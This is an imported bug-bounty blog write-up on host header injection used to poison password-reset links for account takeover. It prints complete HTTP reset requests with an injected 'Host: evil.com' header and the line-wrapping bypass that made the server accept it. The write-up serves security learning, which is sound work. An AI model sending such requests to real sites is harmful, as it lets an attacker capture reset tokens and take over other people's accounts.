---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-09_host-header-injection-lead-to-account-takeovers.md
original_filename: 2022-01-09_host-header-injection-lead-to-account-takeovers.md
title: Host Header Injection Lead To Account Takeovers
category: documents
detected_topics:
- command-injection
- password-reset
- otp
- rate-limit
- api-security
tags:
- imported
- documents
- command-injection
- password-reset
- otp
- rate-limit
- api-security
language: en
raw_sha256: ee667795ceec97c3736fc1dac99dace4e64711e459fea4191fb93756659d0a14
text_sha256: 378c072a10e17119d66445c94bd60cd583cb58c713d2d9e845256d380d52c2d6
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# Host Header Injection Lead To Account Takeovers

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-09_host-header-injection-lead-to-account-takeovers.md
- Source Type: markdown
- Detected Topics: command-injection, password-reset, otp, rate-limit, api-security
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `ee667795ceec97c3736fc1dac99dace4e64711e459fea4191fb93756659d0a14`
- Text SHA256: `378c072a10e17119d66445c94bd60cd583cb58c713d2d9e845256d380d52c2d6`


## Content

---
title: "Host Header Injection Lead To Account Takeovers"
url: "https://systemweakness.com/host-header-injection-lead-to-account-takeover-2f025a645d13"
authors: ["M7.Arman (@ArmanSecurity)"]
bugs: ["Host header injection", "Password reset", "Account takeover"]
publication_date: "2022-01-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3021
scraped_via: "browseros"
---

# Host Header Injection Lead To Account Takeovers

Host Header Injection Lead To Account Takeover
M7arm4n
Follow
3 min read
·
Jan 9, 2022

352

3

Hello amazing hacker, Today, I want to talk about one of my findings in a private pentest program that leads me to take over other user accounts with one click. In One Click To Account Takeover, I noticed that how we can find parameters in JSON and change the host of reset password link, Today we have the same scenario for access to user token, But we use a different way to inject our payload.

First of all, let’s analyze the websites. In this case, I can register with my email address and none of the other info asks me for a complete profile like a phone number or etc.

In my favorite endpoint mean forget the password, after submitting our email address, we will receive and link that is built by: 1. Host 2. Path 3. Token

Same as old stories I want to access the user token till taking over the user account. In this scenario when being real that I able to change the host of the reset password link to collaborate than when the user click on it, I find the token in my logs.

What is Host Header Injection Vulnerability?

In Acunetix and Portswigger, We will find some useful information about this vulnerability that tells us the same story. As you know, We can use this vulnerability in a different way, Some of the important examples: 1. Cache poisoning 2. Reset password poisoning

About cache poisoning, we have a long story to tell. But this time let’s focus on rest password poisoning.

How detect this vulnerability?

This vulnerability can’t be automated because you have to create an account then ask for a reset password link. This scenario has to do manual and sometimes we have a hard way as rate limit that doesn’t let us use tools for fuzzing. Some useful tools for fuzz are Param miner and FFUF. You can find a great list for fuzz in SecList.

Get M7arm4n’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Finally, the main story was there when I ask to reset the password and capture the request then test some common header, I was able to change the Host of reset password link.

POST /reset-password HTTP/1.1
Host: Site.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://Site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
Origin: http://Site.com
Connection: close
Upgrade-Insecure-Requests: 1
_token=S1zqDwFDGrnFQW1MfPJJ0ormBXAAi7DoSfdn8Pap&name=arman&email=attacker@evil.com

I inject one of my common list header and back 400 status.

POST /reset-password HTTP/1.1
Host: Site.com
Host: evil.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://Site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
Origin: http://Site.com
Connection: close
Upgrade-Insecure-Requests: 1
_token=S1zqDwFDGrnFQW1MfPJJ0ormBXAAi7DoSfdn8Pap&name=arman&email=attacker@evil.com

One of the usual bypass for this position is add line wrapping:

POST /reset-password HTTP/1.1
 Host: Site.com
Host: evil.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://Site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
Origin: http://Site.com
Connection: close
Upgrade-Insecure-Requests: 1
_token=S1zqDwFDGrnFQW1MfPJJ0ormBXAAi7DoSfdn8Pap&name=arman&email=attacker@evil.com

After using this bypass I got 200 and I received a poisoning reset password link.

I hope this write-up was helpful for you, Have Good Day.

YouTube

Instagram

Twitter
